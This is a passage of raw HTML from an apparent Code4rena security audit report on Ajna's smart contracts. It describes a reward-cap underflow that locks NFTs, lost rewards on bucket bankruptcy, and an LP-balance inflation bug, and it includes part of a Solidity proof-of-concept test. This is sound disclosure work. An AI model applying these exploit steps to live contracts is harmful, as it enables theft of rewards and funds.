class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">547:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">548:             // set claim reward to difference between cap and reward</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+549:             newRewards_ = rewardsCapped - rewardsClaimedInEpoch_; // @audit</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">550:         }</span></span></span></code></pre>\n<p>We have a situation where <code>rewardsClaimedInEpoch_</code> has been updated by other pools to something like <code>100e18</code>,\nand <code>rewardsCapped</code> for the other pool was <code>30e18</code>, resulting in:<br>\n<code>rewardsClaimedInEpoch_ + newRewards_ > rewardsCapped</code><br>\nand of course we catch the underflow at the time of calculating the remainder, <code>30e18 - 100e18</code>, since there is no remainder\n<code>newRewards_ = rewardsCapped - rewardsClaimedInEpoch_</code>.</p>\n<p>To check the problem, you need to raise <code>rewardsClaimedInEpoch_</code> more than the <code>rewardsCap</code> of a certain pool, with the help of other pools, <code>rewardsCap</code> is a percentage of burned tokens in the pool… so it’s possible.</p>\n<h3 id=\"tools-used-2\" style=\"position:relative;\"><a href=\"#tools-used-2\" aria-label=\"tools used 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<ul>\n<li>Manual review</li>\n<li>Foundry</li>\n</ul>\n<h3 id=\"recommended-mitigation-steps-4\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-4\" aria-label=\"recommended mitigation steps 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<ul>\n<li>Add additional requirements that if <code>rewardsClaimedInEpoch > rewardsCap</code> that <code>updatedRewards_</code> should be zero, not need calculate remaining difference.</li>\n</ul>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/440#issuecomment-1555156243\">MikeHathaway (Ajna) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/440#issuecomment-1569154687\">Picodes (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>Giving Medium severity for “Assets not at direct risk, but the function of the protocol or its availability could be impacted”</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/440#issuecomment-1573707899\">Haipls (warden) commented</a>:</strong></p>\n<blockquote>\n<p>Hi @Picodes - I would like to ask you to reconsider the severity of the issue. You’ve classified it as <code>Med</code> - <code>Assets not at direct risk, but the function of the protocol or its availability could be impacted</code>.</p>\n<p>Upon review, in my opinion, this issue leans more towards HIGH - <code>Assets can be stolen/lost/compromised directly (or indirectly if there is a valid attack path that does not have hand-wavy hypotheticals)</code>. </p>\n<p>Below, I will attempt to present my reasoning and why I think this way:</p>\n<p>I’ve considered <code>2</code> metrics to determine severity:</p>\n<ol>\n<li>Consequences</li>\n<li>The likelihood of it happening</li>\n</ol>\n<p>And came up with the following results:</p>\n<ol>\n<li>\n<p>Consequences</p>\n<p>The consequence of this issue is that in the event of it happening, NFTs are blocked on the RewardsManager.sol contract with no possibility of their further withdrawal. This is critical and falls under: <code>Assets can be stolen/lost/compromised directly</code>. Moreover, these are not just NFTs, they are LP positions.</p>\n<p>When this problem occurs, the ability for <code>stake/unstake/claimRewards</code> of the affected pools is closed due to a mathematical error, leading to a simple blockage of interaction with these pools. As it becomes impossible to process the reward update for a given epoch. For pools that weren’t affected and managed to process before, they will be able to operate further until the situation repeats.</p>\n</li>\n<li>\n<p>The main point in deciding whether it’s <code>Medium/High</code> is how likely this problem is to occur. </p>\n<p>Here I looked at the dependence in calculations on the number of pools</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"c\" data-index=\"20\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  uint256 rewardsCapped = Maths.</span><span class=\"mtk11\">wmul</span><span class=\"mtk1\">(REWARD_CAP, totalBurnedInPeriod);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Check rewards claimed - check that less than 80% of the tokens for a given burn event have been claimed.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (rewardsClaimedInEpoch_ + newRewards_ &gt; rewardsCapped) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// set claim reward to difference between cap and reward</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        newRewards_ = rewardsCapped - rewardsClaimedInEpoch_; </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><code>rewardsClaimedInEpoch_</code> is a value that sums up across all pools</p>\n<p><code>rewardsCapped</code> is a value related to the calculation of a single pool and depends on the number of coins burned in the epoch in the selected pool</p>\n<p>And there arises a situation when <code>n1 - (n2 + n3...+ nn)</code> by pools. In reality, it’s all more complex and depends on the number of burned coins in the pools, but the essence is that the more pools we have, the higher the chances that this condition simply reverts. And this is no longer an unlikely situation.</p>\n</li>\n</ol>\n<p><strong>Also an example of a highly probable situation:</strong></p>\n<p>When there’s a HUGE pool and several small ones in the middle. It’s enough for only the HUGE pool to update the epoch’s reward. This will cause a problem with the condition’s execution for all other small pools</p>\n<p>This can also be a vector of an attacker who purposely burns an extra amount of coins to increase the reward update on the pool. And causes positions blocking in the contract.</p>\n<p>After these considerations, I would like you to reconsider the severity of the problem, as we have two points:</p>\n<ol>\n<li>Direct blocking of funds on the contract.</li>\n<li>The situation is not theoretical.</li>\n</ol>\n<p>I hope my thoughts will be useful. I understand that I can be wrong and I hope you can clarify if I am not understanding something correctly. Thank you.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/440#issuecomment-1574940585\">Picodes (judge) increased severity to High and commented</a>:</strong></p>\n<blockquote>\n<p>Hi @Haipls - thanks for your comment. Upon review, I agree with your take and will upgrade to High.</p>\n</blockquote>\n<hr>\n<h2 id=\"h-06-the-lender-could-possibly-lose-unclaimed-rewards-in-case-a-bucket-goes-bankrupt\" style=\"position:relative;\"><a href=\"#h-06-the-lender-could-possibly-lose-unclaimed-rewards-in-case-a-bucket-goes-bankrupt\" aria-label=\"h 06 the lender could possibly lose unclaimed rewards in case a bucket goes bankrupt permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/329\">[H-06] The lender could possibly lose unclaimed rewards in case a bucket goes bankrupt</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/329\">Koolex</a></em></p>\n<p>When the lender calls <code>PositionManager.memorializePositions</code> method the following happens:</p>\n<ol>\n<li>Records bucket indexes along with its deposit times and lpBalances</li>\n<li>Transfers LP ownership from the lender to PositionManager contract.</li>\n</ol>\n<p>In point 1, it checks if there is a previous deposit and the bucket went bankrupt after prior memorialization, then it zero out the previous tracked LP. However, the lender could still have unclaimed rewards. In this case, the lender loses the rewards due to the lack of claiming rewards before zeroing out the previous tracked LP balance. If you check claim rewards functionality in RewardsManager, the bucket being not bankrupt is not a requirement. Please note that claiming rewards relies on the tracked LP balance in PositionManager.</p>\n<h3 id=\"proof-of-concept-5\" style=\"position:relative;\"><a href=\"#proof-of-concept-5\" aria-label=\"proof of concept 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<ul>\n<li>\n<p><code>PositionManager.memorializePositions</code> method</p>\n<ul>\n<li>\n<p>check for previous deposits and zero out the previous tracked LP if bucket is bankrupt</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"21\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">// check for previous deposits</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">if (position.depositTime != 0) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t// check that bucket didn&#39;t go bankrupt after prior memorialization</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tif (_bucketBankruptAfterDeposit(pool, index, position.depositTime)) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// if bucket did go bankrupt, zero out the LP tracked by position manager</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tposition.lps = 0;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n</li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"22\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">&lt;https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/PositionManager.sol#L192-L199&gt;</span></span></code></pre>\n</li>\n<li>\n<p>In RewardsManager, check <code>claimRewards</code> and <code>_claimRewards</code>  method. there is no a check for bucket’s bankruptcy.</p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/RewardsManager.sol#L114\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/RewardsManager.sol#L114</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/RewardsManager.sol#L561\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/RewardsManager.sol#L561</a></p>\n</li>\n</ul>\n<h3 id=\"recommended-mitigation-steps-5\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-5\" aria-label=\"recommended mitigation steps 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>On memorializePositions, check if the lender already claimed his/her rewards before zeroing out the previous tracked LP.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/329#issuecomment-1608467083\">ith-harvey (Ajna) disputed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/329#issuecomment-1609466700\">grandizzy (Ajna) commented</a>:</strong></p>\n<blockquote>\n<p>That is by design and we acknowledge that documentation of bucket bankruptcy can be improved. When a bucket goes bankrupt (which shouldn’t happen often but only when there’s bad debt in pool to settle) the lender won’t lose only their rewards but will also lose all the shares in that bucket / LP (which has higher impact than rewards).<br>\nAlso the recommendation of:<br>\n<code>On memorializePositions, check if the lender already claimed his/her rewards before zeroing out the previous tracked LP.</code></p>\n<p>Would imply making position manager contract aware of rewards manager contract and we don’t want to couple those 2 in reference implementation. However, additional position and rewards manager could be developed by 3rd parties and could take into consideration this recommendation.</p>\n</blockquote>\n<hr>\n<h2 id=\"h-07-user-can-exponentially-increase-the-value-of-their-position-through-the-memorializepositions-function\" style=\"position:relative;\"><a href=\"#h-07-user-can-exponentially-increase-the-value-of-their-position-through-the-memorializepositions-function\" aria-label=\"h 07 user can exponentially increase the value of their position through the memorializepositions function permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/256\">[H-07] User can exponentially increase the value of their position through the <code>memorializePositions</code> function</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/256\">BPZ</a>, also found by <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/304\">sces60107</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/234\">xuwinnie</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/223\">Koolex</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/217\">ast3ros</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/193\">Haipls</a>, and <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/108\">SpicyMeatball</a></em></p>\n<p>The <a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L42\">PositionManager contract</a> allows a lender to mint an NFT that will be representative of their lp positions. This is done by <a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L227\">minting</a> an NFT and then invoking the <a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L170\">memorializePositions function</a> which will assign their lp positions to the respective NFT. However, while the memorializePositions function will update the lp balances based on the <a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L188\">entirety</a> of the lender’s lp balance for a given index bucket within the pool, the <a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/base/Pool.sol#L74\">Pool contract</a> will update the lender’s balance based on the <a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/libraries/external/LPActions.sol#LL244C70-L244C70\">minimum value</a> between the allowed amount and the lender’s balance. This means that, if a user specifies an allowance for the PositionManager contract by calling the <a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/base/Pool.sol#L455\">increaseLPAllowance function</a> that is less than their total balance for a respective position before invoking the memorializePositions function, their position’s lp balance tracked by the <a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L202\">PositionManager’s state</a> will increase by the entirety of their balance while their position that is tracked by the <a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/libraries/external/LPActions.sol#L260\">Pool’s state</a> will only decrease by the specified allowance. The impact of this is that a lender can exponentially increase the value of their position by repeating the steps of specifying a minimum allowance for the PositionManager for their positions and then invoking memorializePositions until their lp position that is tracked by the Pool’s state is 0. The lender can then <a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L207\">stake</a> this exponentially overvalued position through the <a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L35\">RewardsManager contract</a> allowing them to receive substantially more rewards for their position then should be allotted. The direct implications of this are that the user will be rewarded a substantial amount of AJNA reward tokens which are directly redeemable for the Pool’s quote tokens through its Redeemable Reserve and, additionally, over-value the user’s influence on the protocol’s proposal funding because a user’s votes are weighted by the amount of AJNA tokens they hold. We believe this to be a high severity vulnerability because it directly affects user funds and the functionality of the protocol in general.</p>\n<h3 id=\"proof-of-concept-6\" style=\"position:relative;\"><a href=\"#proof-of-concept-6\" aria-label=\"proof of concept 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The described vulnerability occurs when a lender specifies allowances for the PositionManager contract that are less than their lp balance for each respective index through the <a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/base/Pool.sol#L455\">increaseLPAllowance function</a> and then invokes the <a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L170\">memorializePositions function</a>. The result of this is that the user’s lp balance tracked by the <a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L202\">PositionManager’s state</a> will increment by the position’s balance while the lp balance tracked by the <a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/libraries/external/LPActions.sol#L260\">Pool’s state</a> will only decrement by the specified allowance. A user can repeat this process through multiple iterations until their respective lp balances with the Pool contract are 0 which will exponentially increase the value of their position.    Please see the following test case for a POC simulating the effect of this described vulnerability on a user’s position:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"23\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// SPDX-License-Identifier: UNLICENSED</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">14</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;forge-std/console.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> {</span><span class=\"mtk12\">Base64</span><span class=\"mtk1\">} </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;@base64-sol/base64.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;tests/forge/unit/PositionManager.t.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\"> *  </span><span class=\"mtk4\">@title</span><span class=\"mtk3\">  Proof of Concept</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\"> *  </span><span class=\"mtk4\">@notice</span><span class=\"mtk3\"> Simulates the effect of the described vulnerability where a user</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\"> *          can exponentially increase the value of their position by:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\"> *          1- only approving the </span><span class=\"mtk8\">`PositionManager`</span><span class=\"mtk3\"> for a min amount of their position</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\"> *          2- invoking &#39;memorializePositions&#39; on their position&#39;s respective NFT</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\"> *          3- repeating these steps until their respective position&#39;s Pool lp balance is 0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\"> *  </span><span class=\"mtk4\">@dev</span><span class=\"mtk3\">    This test case can be implemented and run from the ajna-core/tests/forge directory</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\"> */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">POC</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">PositionManagerERC20PoolHelperContract</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testMemorializePositionsWithMinApproval</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">intialLPBalance</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">finalLPBalance</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">testsAddress</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">makeAddr</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;testsAddress&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mintAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">10000</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_mintQuoteAndApproveManagerTokens</span><span class=\"mtk1\">(</span><span class=\"mtk12\">testsAddress</span><span class=\"mtk1\">, </span><span class=\"mtk12\">mintAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Call pool contract directly to add quote tokens</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">indexes</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">3</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">indexes</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk7\">2550</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">indexes</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">] = </span><span class=\"mtk7\">2551</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">indexes</span><span class=\"mtk1\">[</span><span class=\"mtk7\">2</span><span class=\"mtk1\">] = </span><span class=\"mtk7\">2552</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_addInitialLiquidity</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">from:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">testsAddress</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">amount:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">3_000</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">index:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">indexes</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        });</span></span></span>\n<span class=\"grvsc-line\"><span 